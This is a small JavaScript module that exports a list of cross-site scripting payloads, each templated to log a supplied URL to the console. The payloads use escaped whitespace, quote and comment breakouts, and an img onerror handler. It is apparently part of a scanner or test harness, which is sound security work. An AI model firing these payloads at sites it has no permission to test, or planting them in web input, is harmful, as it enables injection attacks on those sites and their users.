const xssScripts = {};
xssScripts.scripts = url =>
  [
    `<script\x20type="text/javascript">javascript:console.log(${JSON.stringify(url)});</script>`,
    `<script\x3Etype="text/javascript">javascript:console.log(${JSON.stringify(url)});</script>`,
    `<script\x0Dtype="text/javascript">javascript:console.log(${JSON.stringify(url)});</script>`,
    `\x3Cscript>javascript:console.log(${JSON.stringify(url)})</script>`,
    `'"\`><script>/* *\x2Fjavascript:console.log(${JSON.stringify(url)})// */</script>`,
    `');console.log(${JSON.stringify(url)});//`,
    `--><!-- ---> <img src=xxx:x onerror=javascript:console.log(${JSON.stringify(url)})> -->`,
    `<script\x09type="text/javascript">javascript:console.log(${JSON.stringify(url)});</script>`,
    `<script\x0Ctype="text/javascript">javascript:console.log(${JSON.stringify(url)});</script>`,
    `<script\x2Ftype="text/javascript">javascript:console.log(${JSON.stringify(url)});</script>`,
    `<script\x0Atype="text/javascript">javascript:console.log(${JSON.stringify(url)});</script>`,
  ];

module.exports = xssScripts;
